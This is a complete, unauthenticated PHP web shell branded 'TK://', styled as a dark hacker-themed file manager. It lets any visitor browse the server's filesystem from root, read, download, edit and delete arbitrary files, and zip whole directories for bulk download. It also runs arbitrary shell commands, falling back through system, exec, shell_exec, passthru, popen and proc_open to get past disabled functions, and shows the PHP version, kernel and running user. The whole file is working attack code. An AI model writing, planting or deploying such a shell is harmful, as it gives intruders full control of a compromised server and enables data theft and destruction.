<?php
$p=isset($_GET['p'])?$_GET['p']:'/';$a=isset($_GET['a'])?$_GET['a']:'browse';$d=isset($_GET['dl'])?$_GET['dl']:'';
$p=str_replace("\0",'',$p);$p=rtrim($p,'/').'/';if($p==='/')$p='/';
if($a==='read'&&$d){$d=str_replace("\0",'',$d);$c=@file_get_contents($d);if($c!==false){header('Content-Type: text/plain; charset=utf-8');echo $c;}else{header('Content-Type: text/plain');echo '[ERROR] File not readable';}exit;}
if($a==='dlfile'&&$d){$d=str_replace("\0",'',$d);if(@is_readable($d)&&@is_file($d)){header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($d).'"');header('Content-Length: '.@filesize($d));@readfile($d);}else{header('Content-Type: text/plain');echo '[ERROR] File not readable';}exit;}
if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['a'])&&$_POST['a']==='save'){header('Content-Type: application/json');$f=isset($_POST['f'])?str_replace("\0",'',$_POST['f']):'';$c=isset($_POST['content'])?$_POST['content']:'';if($f===''||!@is_file($f)){echo json_encode(['ok'=>false,'error'=>'Invalid file path']);}elseif(@file_put_contents($f,$c)!==false){echo json_encode(['ok'=>true]);}else{echo json_encode(['ok'=>false,'error'=>'Write failed']);}exit;}
$ze='';if($a==='zip'&&isset($_GET['t'])){$t=str_replace("\0",'',$_GET['t']);$t=rtrim($t,'/');if(!is_dir($t)){$ze='ZIP failed - not a directory: '.$t;}elseif(class_exists('ZipArchive')){$tf=sys_get_temp_dir().'/z_'.uniqid().'.zip';$z=new ZipArchive();if($z->open($tf,ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){$b=basename($t);$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $fi){$r=$fi->getRealPath();$rl=$b.'/'.substr($r,strlen($t)+1);if($fi->isDir())$z->addEmptyDir($rl);elseif($fi->isFile()&&is_readable($r))$z->addFile($r,$rl);}$z->close();header('Content-Type: application/zip');header('Content-Disposition: attachment; filename="'.$b.'_'.date('Ymd_His').'.zip"');header('Content-Length: '.filesize($tf));readfile($tf);unlink($tf);exit;}$ze='ZIP failed - could not create archive';}else{$pr=dirname($t);$b=basename($t);$tf=sys_get_temp_dir().'/t_'.uniqid().'.tar.gz';$cm='cd '.escapeshellarg($pr).' && tar czf '.escapeshellarg($tf).' '.escapeshellarg($b).' 2>&1';@exec($cm,$o,$rt);if($rt===0&&@is_file($tf)){header('Content-Type: application/gzip');header('Content-Disposition: attachment; filename="'.$b.'_'.date('Ymd_His').'.tar.gz"');header('Content-Length: '.filesize($tf));readfile($tf);unlink($tf);exit;}@unlink($tf);$ze='ZIP failed - ZipArchive missing, tar fallback failed';}}
$dm='';if($a==='del'&&isset($_GET['f'])){$f=str_replace("\0",'',$_GET['f']);if(@is_file($f)&&@unlink($f)){$dm='Deleted: '.basename($f);}else{$dm='Delete failed: '.basename($f);}}
$co='';$cm='';$ci='';if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['cmd'])){$ci=$_POST['cmd'];$cx=$ci;if(function_exists('system')){ob_start();@system($cx.' 2>&1');$co=ob_get_clean();$cm='system()';}elseif(function_exists('exec')){$o=[];@exec($cx.' 2>&1',$o);$co=implode("\n",$o);$cm='exec()';}elseif(function_exists('shell_exec')){$co=@shell_exec($cx.' 2>&1');$cm='shell_exec()';}elseif(function_exists('passthru')){ob_start();@passthru($cx.' 2>&1');$co=ob_get_clean();$cm='passthru()';}elseif(function_exists('popen')){$h=@popen($cx.' 2>&1','r');if($h){$co=@stream_get_contents($h);pclose($h);$cm='popen()';}}elseif(function_exists('proc_open')){$ds=[1=>['pipe','w'],2=>['pipe','w']];$pc=@proc_open($cx,$ds,$pp);if(is_resource($pc)){$co=@stream_get_contents($pp[1]).@stream_get_contents($pp[2]);fclose($pp[1]);fclose($pp[2]);proc_close($pc);$cm='proc_open()';}}if($cm===''){$co='No exec function available';$cm='NONE';}$p=isset($_POST['p'])?$_POST['p']:$p;}
$ef=['system','exec','shell_exec','passthru','popen','proc_open'];$di=ini_get('disable_functions');
function sd($p){$en=@scandir($p);if($en===false)return null;$dr=[];$fl=[];foreach($en as $e){if($e==='.'||$e==='..')continue;$fu=rtrim($p,'/') .'/'.$e;if(@is_dir($fu)){$dr[]=$e;}else{$s=@filesize($fu);$fl[]=['n'=>$e,'s'=>$s,'r'=>@is_readable($fu)];}}sort($dr);usort($fl,fn($a,$b)=>strcmp($a['n'],$b['n']));return['d'=>$dr,'f'=>$fl];}
function hs($b){if($b===false||$b===null)return'?';if($b<1024)return $b.' B';if($b<1048576)return round($b/1024,1).' KB';return round($b/1048576,1).' MB';}
function bc($p){$pt=explode('/',trim($p,'/'));$cr=[['l'=>'/','p'=>'/']];$cu='';foreach($pt as $x){if($x==='')continue;$cu.='/'.$x;$cr[]=['l'=>$x,'p'=>$cu.'/'];}return $cr;}
$rs=sd($p);$cr=bc($p);$pr=null;if($p!=='/'){$pr=dirname(rtrim($p,'/'));if($pr!=='/')$pr.='/';}
?><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>tk:// <?=htmlspecialchars($p)?></title>
<style>:root{--bg:#0a0a0f;--pn:#0f0f1a;--bd:#1e1e35;--ac:#00ff88;--a2:#00aaff;--wn:#ff6b35;--rd:#ff4444;--dm:#3a3a5c;--tx:#c8c8e8;--td:#5a5a7a;--dc:#00aaff;--fc:#c8c8e8}*{box-sizing:border-box;margin:0;padding:0}body{background:var(--bg);color:var(--tx);font-family:'Courier New',Courier,monospace;font-size:13px;min-height:100vh;padding:0;padding-bottom:30px}body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.015) 2px,rgba(0,255,136,.015) 4px);pointer-events:none;z-index:9999}.tb{background:var(--pn);border-bottom:1px solid var(--bd);padding:10px 20px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100}.lo{color:var(--ac);font-weight:700;font-size:14px;letter-spacing:2px;text-shadow:0 0 12px rgba(0,255,136,.6)}.sp{color:var(--dm)}.bc{display:flex;align-items:center;gap:4px;flex:1;flex-wrap:wrap}.bc a{color:var(--a2);text-decoration:none;padding:2px 6px;border-radius:3px;transition:background .15s}.bc a:hover{background:rgba(0,170,255,.15)}.bc .sl{color:var(--dm)}.bc .cu{color:var(--tx)}.ct{max-width:1200px;margin:0 auto;padding:20px}.pi{display:flex;gap:8px;margin-bottom:16px}.px{flex:1;background:var(--pn);border:1px solid var(--bd);color:var(--ac);font-family:'Courier New',Courier,monospace;font-size:13px;padding:8px 12px;border-radius:4px;outline:none;transition:border-color .2s}.px:focus{border-color:var(--ac);box-shadow:0 0 8px rgba(0,255,136,.2)}.bt{background:transparent;border:1px solid var(--ac);color:var(--ac);font-family:'Courier New',Courier,monospace;font-size:12px;padding:8px 16px;border-radius:4px;cursor:pointer;transition:all .15s;text-decoration:none;display:inline-block}.bt:hover{background:rgba(0,255,136,.1);box-shadow:0 0 8px rgba(0,255,136,.3)}.bw{border-color:var(--wn);color:var(--wn)}.bw:hover{background:rgba(255,107,53,.1)}.bb{border-color:var(--a2);color:var(--a2)}.bb:hover{background:rgba(0,170,255,.1)}.br{border-color:var(--rd);color:var(--rd)}.br:hover{background:rgba(255,68,68,.1)}.bs{padding:3px 8px;font-size:11px}.pn{background:var(--pn);border:1px solid var(--bd);border-radius:6px;overflow:hidden;margin-bottom:16px}.ph{padding:8px 16px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:8px;font-size:11px;color:var(--td);letter-spacing:1px;text-transform:uppercase}.ph .cn{background:var(--bd);padding:1px 6px;border-radius:10px;color:var(--tx)}.en{display:grid;grid-template-columns:24px 1fr 80px auto;align-items:center;gap:8px;padding:7px 16px;border-bottom:1px solid rgba(30,30,53,.5);transition:background .1s}.en:last-child{border-bottom:none}.en:hover{background:rgba(255,255,255,.03)}.ei{text-align:center;font-size:14px}.nm{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.nm a{text-decoration:none;transition:color .15s}.nm a:hover{text-decoration:underline}.dn a{color:var(--dc)}.dn a:hover{color:#66ccff;text-shadow:0 0 8px rgba(0,170,255,.4)}.fn a{color:var(--fc)}.fn a.ur{color:var(--td);cursor:default}.es{color:var(--td);font-size:11px;text-align:right}.ea{text-align:right;display:flex;gap:4px;justify-content:flex-end}.rl{color:var(--ac);text-decoration:none;font-size:11px;padding:2px 6px;border:1px solid rgba(0,255,136,.3);border-radius:3px;transition:all .15s}.rl:hover{background:rgba(0,255,136,.1);border-color:var(--ac)}.rl.ds{color:var(--dm);border-color:var(--dm);cursor:default;pointer-events:none}.eb{padding:20px;color:var(--wn);text-align:center;font-size:12px}.pw{display:flex;align-items:center;gap:8px;padding:8px 16px;border-bottom:1px solid rgba(30,30,53,.5)}.pw a{color:var(--a2);text-decoration:none;font-size:12px}.pw a:hover{text-decoration:underline}.mg{padding:8px 16px;font-size:12px;border-radius:4px;margin-bottom:12px;border:1px solid}.mo{color:var(--ac);border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.05)}.me{color:var(--wn);border-color:rgba(255,107,53,.3);background:rgba(255,107,53,.05)}.cr{display:flex;gap:8px;padding:10px 16px}.cx{flex:1;background:var(--bg);border:1px solid var(--bd);color:var(--ac);font-family:inherit;font-size:13px;padding:8px 12px;border-radius:4px;outline:none}.cx:focus{border-color:var(--ac);box-shadow:0 0 8px rgba(0,255,136,.2)}.co{padding:12px 16px;white-space:pre-wrap;word-break:break-all;font-size:12px;line-height:1.5;color:var(--tx);max-height:400px;overflow:auto;background:rgba(0,0,0,.3);border-top:1px solid var(--bd)}.mt{padding:4px 16px;font-size:10px;color:var(--dm);border-top:1px solid var(--bd)}.cf{padding:6px 16px;font-size:10px;color:var(--dm);display:flex;gap:10px;flex-wrap:wrap}.fo{color:var(--ac)}.fx{color:var(--rd);text-decoration:line-through}#vw{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.85);z-index:1000;padding:20px}#vw.active{display:flex;flex-direction:column}.vh{background:var(--pn);border:1px solid var(--bd);border-bottom:none;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;border-radius:6px 6px 0 0}.vt{color:var(--ac);font-size:12px}.va{display:flex;gap:8px}.vc{background:none;border:1px solid var(--wn);color:var(--wn);padding:4px 10px;cursor:pointer;font-family:'Courier New',Courier,monospace;font-size:11px;border-radius:3px}.vc:hover{background:rgba(255,107,53,.15)}#vn{flex:1;background:var(--pn);border:1px solid var(--bd);border-radius:0 0 6px 6px;overflow:auto;padding:16px;white-space:pre;font-family:'Courier New',Courier,monospace;font-size:12px;line-height:1.6;color:var(--tx)}.sb{display:flex;gap:20px;padding:6px 20px;background:var(--pn);border-top:1px solid var(--bd);font-size:11px;color:var(--td);position:fixed;bottom:0;left:0;right:0}.sb .ok{color:var(--ac)}.sb .pd{color:var(--a2)}</style>
<script>var cp='';function rf(q,n){cp=q;ce();var v=document.getElementById('vw'),c=document.getElementById('vn'),tt=document.getElementById('vt');tt.textContent=q;c.textContent='Loading...';var dl=document.getElementById('vd');if(dl)dl.href='?a=dlfile&dl='+encodeURIComponent(q);v.classList.add('active');var x=new XMLHttpRequest();x.open('GET','?a=read&dl='+encodeURIComponent(q),true);x.onload=function(){c.textContent=x.status===200?x.responseText:'[HTTP ERROR '+x.status+']';};x.onerror=function(){c.textContent='[NETWORK ERROR]';};x.send();}
function cv(){ce();document.getElementById('vw').classList.remove('active');}
function se(){var c=document.getElementById('vn'),e=document.getElementById('ve');e.value=c.textContent;c.style.display='none';e.style.display='block';document.getElementById('be').style.display='none';document.getElementById('bv').style.display='';document.getElementById('bx').style.display='';e.focus();}
function ce(){var c=document.getElementById('vn'),e=document.getElementById('ve');c.style.display='';e.style.display='none';document.getElementById('be').style.display='';document.getElementById('bv').style.display='none';document.getElementById('bx').style.display='none';}
function sf(){var e=document.getElementById('ve'),b=document.getElementById('bv');b.textContent='SAVING...';b.disabled=true;var d=new FormData();d.append('a','save');d.append('f',cp);d.append('content',e.value);var x=new XMLHttpRequest();x.open('POST',window.location.pathname,true);x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.ok){document.getElementById('vn').textContent=e.value;ce();}else{alert('Save failed: '+(r.error||'unknown'));}b.textContent='SAVE';b.disabled=false;}catch(ex){alert('Save failed');b.textContent='SAVE';b.disabled=false;}};x.onerror=function(){alert('Save failed: network error');b.textContent='SAVE';b.disabled=false;};x.send(d);}</script>
</head><body>
<div class="tb"><span class="lo">TK://</span><span class="sp">|</span><div class="bc"><?php foreach($cr as $i=>$c):?><?php if($i>0):?><span class="sl">/</span><?php endif;?><?php if($i<count($cr)-1):?><a href="?p=<?=urlencode($c['p'])?>"><?=htmlspecialchars($c['l'])?></a><?php else:?><span class="cu"><?=htmlspecialchars($c['l'])?></span><?php endif;?><?php endforeach;?></div></div>
<div class="ct">
<?php if($dm):?><div class="mg <?=strpos($dm,'failed')!==false?'me':'mo'?>"><?=htmlspecialchars($dm)?></div><?php endif;?>
<?php if($ze):?><div class="mg me"><?=htmlspecialchars($ze)?></div><?php endif;?>
<form method="get" class="pi"><input type="text" name="p" class="px" value="<?=htmlspecialchars($p)?>" placeholder="/path..." id="pI"><button type="submit" class="bt">GO</button><a href="?p=/" class="bt bb">ROOT</a><a href="?a=zip&t=<?=urlencode(rtrim($p,'/'))?>" class="bt bw">ZIP</a></form>
<div class="pn"><div class="ph">CMD <span class="cn"><?=$cm?:'---'?></span></div><form method="post" class="cr"><input type="hidden" name="p" value="<?=htmlspecialchars($p)?>"><input type="text" name="cmd" class="cx" value="<?=htmlspecialchars($ci)?>" placeholder="command..." id="cI" autocomplete="off"><button type="submit" class="bt">RUN</button></form><div class="cf"><?php foreach($ef as $fn):?><span class="<?=function_exists($fn)?'fo':'fx'?>"><?=$fn?></span><?php endforeach;?><?php if($di):?><span style="color:var(--wn)">disabled: <?=htmlspecialchars(substr($di,0,120))?></span><?php endif;?></div><?php if($co!==''):?><div class="co"><?=htmlspecialchars($co)?></div><div class="mt">via <?=$cm?> | <?=strlen($co)?> bytes</div><?php endif;?></div>
<?php if($rs===null):?><div class="pn"><div class="eb">Permission denied or invalid path: <strong><?=htmlspecialchars($p)?></strong></div></div>
<?php else:?>
<?php if(!empty($rs['d'])):?><div class="pn"><div class="ph">DIRS <span class="cn"><?=count($rs['d'])?></span></div><?php if($pr!==null):?><div class="pw"><a href="?p=<?=urlencode($pr)?>">..</a></div><?php endif;?><?php foreach($rs['d'] as $dd):$fu=rtrim($p,'/') .'/'.$dd.'/';?><div class="en"><span class="ei">d</span><span class="nm dn"><a href="?p=<?=urlencode($fu)?>"><?=htmlspecialchars($dd)?>/</a></span><span class="es">DIR</span><span class="ea"><a href="?a=zip&t=<?=urlencode(rtrim($fu,'/'))?>" class="bt bs bw">zip</a><a href="?p=<?=urlencode($fu)?>" class="rl">open</a></span></div><?php endforeach;?></div>
<?php elseif($pr!==null):?><div class="pn"><div class="pw"><a href="?p=<?=urlencode($pr)?>">..</a></div></div><?php endif;?>
<?php if(!empty($rs['f'])):?><div class="pn"><div class="ph">FILES <span class="cn"><?=count($rs['f'])?></span></div><?php foreach($rs['f'] as $fi):$fu=rtrim($p,'/') .'/'.$fi['n'];?><div class="en"><span class="ei"><?=$fi['r']?'f':'x'?></span><span class="nm fn"><?php if($fi['r']):?><a href="#" onclick="rf('<?=addslashes(htmlspecialchars($fu))?>','<?=addslashes(htmlspecialchars($fi['n']))?>');return false;"><?=htmlspecialchars($fi['n'])?></a><?php else:?><a class="ur"><?=htmlspecialchars($fi['n'])?></a><?php endif;?></span><span class="es"><?=hs($fi['s'])?></span><span class="ea"><?php if($fi['r']):?><a href="?a=dlfile&dl=<?=urlencode($fu)?>" class="bt bs bb">dl</a><a href="#" onclick="rf('<?=addslashes(htmlspecialchars($fu))?>','<?=addslashes(htmlspecialchars($fi['n']))?>');return false;" class="rl">read</a><?php else:?><span class="rl ds">locked</span><?php endif;?><a href="?a=del&f=<?=urlencode($fu)?>&p=<?=urlencode($p)?>" class="bt bs br" onclick="return confirm('Delete <?=addslashes(htmlspecialchars($fi['n']))?> ?')">del</a></span></div><?php endforeach;?></div><?php endif;?>
<?php if(empty($rs['d'])&&empty($rs['f'])):?><div class="pn"><div class="eb" style="color:var(--td)">Empty directory</div></div><?php endif;?>
<?php endif;?>
</div>
<div id="vw"><div class="vh"><span class="vt" id="vt">-</span><div class="va"><a href="#" id="vd" class="bt bs bb">download</a><button id="be" class="bt bs bw" onclick="se()">EDIT</button><button id="bv" class="bt bs" onclick="sf()" style="display:none">SAVE</button><button id="bx" class="bt bs br" onclick="ce()" style="display:none">CANCEL</button><button class="vc" onclick="cv()">CLOSE</button></div></div><div id="vn">Loading...</div><textarea id="ve" style="display:none;flex:1;background:var(--pn);border:1px solid var(--bd);border-radius:0 0 6px 6px;padding:16px;white-space:pre;font-family:'Courier New',Courier,monospace;font-size:12px;line-height:1.6;color:var(--tx);resize:none;outline:none;width:100%"></textarea></div>
<div class="sb"><span>TK</span><span class="pd"><?=htmlspecialchars($p)?></span><?php if($rs!==null):?><span class="ok"><?=count($rs['d'])?>d / <?=count($rs['f'])?>f</span><?php endif;?><span>PHP <?=phpversion()?></span><span><?=php_uname('s').' '.php_uname('r')?></span><span><?=function_exists('posix_getpwuid')?posix_getpwuid(posix_geteuid())['name']:get_current_user()?></span></div>
<script>document.addEventListener('keydown',function(e){if(e.key==='Escape')cv();if(e.key==='/'&&document.activeElement!==document.getElementById('pI')){e.preventDefault();document.getElementById('pI').focus();document.getElementById('pI').select();}if(e.key===':'&&!['INPUT','TEXTAREA'].includes(document.activeElement.tagName)){e.preventDefault();document.getElementById('cI').focus();}});</script>
</body></html>